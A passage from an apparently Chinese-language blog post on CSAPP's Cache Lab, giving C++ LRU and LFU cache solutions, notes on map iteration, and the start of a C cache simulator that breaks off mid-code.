class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  <span class="type">int</span> key, value;</span><br><span class="line">  Node *prev;</span><br><span class="line">  Node *next;</span><br><span class="line">  <span class="built_in">Node</span>(): <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">value</span>(<span class="number">0</span>), <span class="built_in">prev</span>(<span class="literal">nullptr</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">  <span class="built_in">Node</span>(<span class="type">int</span> key, <span class="type">int</span> value): <span class="built_in">key</span>(key), <span class="built_in">value</span>(value), <span class="built_in">prev</span>(<span class="literal">nullptr</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, Node*&gt; key_table_;</span><br><span class="line">  Node *head_, *tail_;</span><br><span class="line">  <span class="type">int</span> capacity_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// must set size_(0), otherwise size_ = -1094795585</span></span><br><span class="line">  <span class="built_in">LRUCache</span>(<span class="type">int</span> capacity): <span class="built_in">capacity_</span>(capacity) &#123;</span><br><span class="line">    head_ = <span class="keyword">new</span> Node;</span><br><span class="line">    tail_ = <span class="keyword">new</span> Node;</span><br><span class="line">    head_-&gt;next = tail_;</span><br><span class="line">    tail_-&gt;prev = head_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!key_table_.<span class="built_in">count</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> node = key_table_[key];</span><br><span class="line">    <span class="built_in">moveToHead</span>(node);</span><br><span class="line">    <span class="keyword">return</span> node-&gt;value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!key_table_.<span class="built_in">count</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key_table_.<span class="built_in">size</span>() == capacity_) &#123;</span><br><span class="line">        <span class="keyword">auto</span> last = tail_-&gt;prev;</span><br><span class="line">        <span class="built_in">removeNode</span>(tail_-&gt;prev);</span><br><span class="line">        key_table_.<span class="built_in">erase</span>(last-&gt;key);</span><br><span class="line">        <span class="keyword">delete</span> last;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">auto</span> node = <span class="keyword">new</span> <span class="built_in">Node</span>(key, value);</span><br><span class="line">      <span class="built_in">addToHead</span>(node);</span><br><span class="line">      key_table_[key] = node;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">auto</span> node = key_table_[key];</span><br><span class="line">      node-&gt;value = value;</span><br><span class="line">      <span class="built_in">moveToHead</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">addToHead</span><span class="params">(Node *node)</span> </span>&#123;</span><br><span class="line">    node-&gt;prev = head_;</span><br><span class="line">    node-&gt;next = head_-&gt;next;</span><br><span class="line">    head_-&gt;next-&gt;prev = node;</span><br><span class="line">    head_-&gt;next = node;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">removeNode</span><span class="params">(Node *node)</span> </span>&#123;</span><br><span class="line">    node-&gt;prev-&gt;next = node-&gt;next;</span><br><span class="line">    node-&gt;next-&gt;prev = node-&gt;prev;</span><br><span class="line">    <span class="comment">// cannot delete node in removeNode()</span></span><br><span class="line">    <span class="comment">// otherwise moveTohead() will raise heap-use-after-free</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">moveToHead</span><span class="params">(Node *node)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">removeNode</span>(node);</span><br><span class="line">    <span class="built_in">addToHead</span>(node); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * LRUCache* obj = new LRUCache(capacity);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;get(key);</span></span><br><span class="line"><span class="comment"> * obj-&gt;put(key,value);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><blockquote><p>对比<a href="https://leetcode.cn/problems/lru-cache/solutions/259678/lruhuan-cun-ji-zhi-by-leetcode-solution/?utm_source=LCUS&amp;utm_medium=ip_redirect&amp;utm_campaign=transfer2china">官方题解</a>有两个优点：</p><ol><li>不额外设置<code>size_</code>成员，而使用<code>key_table_.size()</code>，既节约了空间，又减少了直接对<code>size_</code>的操作，降低了犯错风险；</li><li>官方题解中在双向队列满时是先添加再删除，而这里是先删除再添加，更贴合要求。</li></ol><p>改进点：没有必要使用<code>head</code>和<code>tail</code>这两个dummy节点，像<code>list</code>[C++11]那样使用双向链表能节约一个节点的空间。</p></blockquote><h2 id="460-LFU-Cache"><a href="https://leetcode.cn/problems/lfu-cache/">460. LFU Cache</a></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  <span class="type">int</span> key, value, freq;</span><br><span class="line">  <span class="built_in">Node</span>(<span class="type">int</span> key, <span class="type">int</span> value, <span class="type">int</span> freq): <span class="built_in">key</span>(key), <span class="built_in">value</span>(value), <span class="built_in">freq</span>(freq) &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFUCache</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, list&lt;Node&gt;&gt; freq_table_;</span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, list&lt;Node&gt;::iterator&gt; key_table_;</span><br><span class="line">  <span class="type">int</span> capacity_, min_freq_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">LFUCache</span>(<span class="type">int</span> capacity): <span class="built_in">capacity_</span>(capacity), <span class="built_in">min_freq_</span>(<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// freq_table_.clear();</span></span><br><span class="line">    <span class="comment">// key_table_.clear();</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> it = key_table_.<span class="built_in">find</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (it == key_table_.<span class="built_in">end</span>()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">auto</span> node = it-&gt;second;</span><br><span class="line">    <span class="type">int</span> value = node-&gt;value, freq = node-&gt;freq;</span><br><span class="line">    freq_table_[freq].<span class="built_in">erase</span>(node);</span><br><span class="line">    <span class="keyword">if</span> (freq_table_[freq].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">      freq_table_.<span class="built_in">erase</span>(freq);</span><br><span class="line">      <span class="keyword">if</span> (freq == min_freq_) ++min_freq_;</span><br><span class="line">    &#125;</span><br><span class="line">    freq_table_[freq+<span class="number">1</span>].<span class="built_in">push_front</span>(<span class="built_in">Node</span>(key, value, freq+<span class="number">1</span>));</span><br><span class="line">    key_table_[key] = freq_table_[freq+<span class="number">1</span>].<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> it = key_table_.<span class="built_in">find</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (it == key_table_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key_table_.<span class="built_in">size</span>() == capacity_) &#123;</span><br><span class="line">        <span class="keyword">auto</span> last = freq_table_[min_freq_].<span class="built_in">back</span>();  <span class="comment">// back()和end()的区别</span></span><br><span class="line">        freq_table_[min_freq_].<span class="built_in">pop_back</span>();</span><br><span class="line">        key_table_.<span class="built_in">erase</span>(last.key);  <span class="comment">// 这里是Node</span></span><br><span class="line">        <span class="keyword">if</span> (freq_table_[min_freq_].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">          freq_table_.<span class="built_in">erase</span>(min_freq_);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      freq_table_[<span class="number">1</span>].<span class="built_in">push_front</span>(<span class="built_in">Node</span>(key, value, <span class="number">1</span>));</span><br><span class="line">      key_table_[key] = freq_table_[<span class="number">1</span>].<span class="built_in">begin</span>();</span><br><span class="line">      min_freq_ = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">auto</span> node = it-&gt;second;</span><br><span class="line">      <span class="type">int</span> freq = node-&gt;freq;</span><br><span class="line">      freq_table_[freq].<span class="built_in">erase</span>(node);</span><br><span class="line">      <span class="keyword">if</span> (freq_table_[freq].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        freq_table_.<span class="built_in">erase</span>(freq);</span><br><span class="line">        <span class="keyword">if</span> (freq == min_freq_) ++min_freq_;</span><br><span class="line">      &#125;</span><br><span class="line">      freq_table_[freq+<span class="number">1</span>].<span class="built_in">push_front</span>(<span class="built_in">Node</span>(key, value, freq+<span class="number">1</span>));</span><br><span class="line">      key_table_[key] = freq_table_[freq+<span class="number">1</span>].<span class="built_in">begin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>Q: back()和end()的区别？<br>A: back()返回最后一个元素，end()返回指向最后一个元素的迭代器。</p><p>Q: map的迭代方式？<br>A: 参考https://stackoverflow.com/a/26282004ou can achieve this like following :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">map&lt;string, <span class="type">int</span>&gt;::iterator it;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (it = symbolTable.<span class="built_in">begin</span>(); it != symbolTable.<span class="built_in">end</span>(); it++)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; it-&gt;first    <span class="comment">// string (key)</span></span><br><span class="line">              &lt;&lt; <span class="string">&#x27;:&#x27;</span></span><br><span class="line">              &lt;&lt; it-&gt;second   <span class="comment">// string&#x27;s value </span></span><br><span class="line">              &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>With <em>C++11</em> ( and onwards ),</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> <span class="type">const</span>&amp; x : symbolTable)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; x.first  <span class="comment">// string (key)</span></span><br><span class="line">              &lt;&lt; <span class="string">&#x27;:&#x27;</span> </span><br><span class="line">              &lt;&lt; x.second <span class="comment">// string&#x27;s value </span></span><br><span class="line">              &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>With <em>C++17</em> ( and onwards ),</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> <span class="type">const</span>&amp; [key, val] : symbolTable)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; key        <span class="comment">// string (key)</span></span><br><span class="line">              &lt;&lt; <span class="string">&#x27;:&#x27;</span>  </span><br><span class="line">              &lt;&lt; val        <span class="comment">// string&#x27;s value</span></span><br><span class="line">              &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="Part-A-Writing-a-Cache-Simulator">Part A: Writing a Cache Simulator</h1><p>Part A 给出了一些后缀名为 <code>trace</code> 的文件，文件中的内容如下图所示，其中每一行代表一次对缓存的操作，格式为 <code>[空格] 操作 地址,数据大小</code>，其中操作的类型有以下几种：</p><ul><li><strong>I</strong>：取指令操作</li><li><strong>L</strong>：读数据操作</li><li><strong>S</strong>：写数据操作</li><li><strong>M</strong>：修改数据操作，比如先读一次数据再写一次数据</li></ul><p>只有 <strong>I</strong> 操作没有带前置空格，其他操作都有一个前置空格。地址为 64 位，数据大小以字节为单位。</p><p>Part A 要求实现的缓存存储器的行为和 <code>csim-ref</code> 一致，使用 LRU 算法进行替换操作。CSAPP 中指出高速缓存存储器可以用四元组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>S</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>B</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S,E,B,m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 来描述，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msup><mn>2</mn><mi>s</mi></msup></mrow><annotation encoding="application/x-tex">S=2^s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span></span></span> 为组数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 为行数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><msup><mn>2</mn><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">B=2^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span> 为块的大小，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 为地址的位数，具体结构如下图所示：</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/2065884-20220517201155109-1049176038.png" alt="img"></p><p>对于模拟的高速缓存，至少需要接受 4 个参数：</p><ul><li><code>-s</code>：组索引的位数</li><li><code>-E</code>：行数</li><li><code>-b</code>：块大小 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>=</mo><msup><mn>2</mn><mi>b</mi></msup></mrow><annotation encoding="application/x-tex">B=2^b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span></span></span></span> 中的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></li><li><code>-t</code>：<code>trace</code> 文件的路径</li></ul><p>根据给定的 <code>trace</code> 文件，模拟的高速缓存 <code>csim</code> 需要给出命中次数、未命中次数和替换次数，只有和 <code>csim-ref</code> 的次数一样才能拿到分数。</p><h2 id="法1：二维数组-计数法">法1：二维数组+计数法</h2><p>如上，LRU通过实现一个哈希表与双向列表的组合结构，可以实现 <code>put(key)</code> 和 <code>get(key, value)</code> 的时间复杂度均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>的。<br>这里使用二维数组+计数模拟时间戳的方法，每次操作后，需要将所有节点的计数都增一，时间复杂度将会达到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo>⋅</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N\cdot M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>分别表示访问缓存次数和缓存容量大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> valid;  <span class="comment">// C中无bool</span></span><br><span class="line">  <span class="type">int</span> tag;</span><br><span class="line">  <span class="type">int</span> time;</span><br><span class="line">&#125; CacheLine, *CacheSet, **Cache;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MallocCache</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeCache</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Simulate</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">LRUUpdate</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AccessCache</span><span class="params">(<span class="type">uint64_t</span> addr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_PATH_LENGTH 100</span></span><br><span class="line"><span class="comment">// C++种可以使用const int类型变量定义数组维度，但是C中不行</span></span><br><span class="line"><span class="comment">// static const int MAX_FILE_PATH_LENGTH = 100;  // error: variably modified</span></span><br><span class="line"><span class="comment">// ‘file_path’ at file scope</span></span><br><span class="line"><span class="type">static</span> Cache cache;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s, S, E, b;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> file_path[MAX_FILE_PATH_LENGTH];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hit, miss, evict;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MallocCache</span><span class="params">()</span> &#123;</span><br><span class="line">  cache = (Cache)<span class="built_in">malloc</span>(S * <span class="keyword">sizeof</span>(CacheSet));</span><br><span class="line">  assert(cache);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">    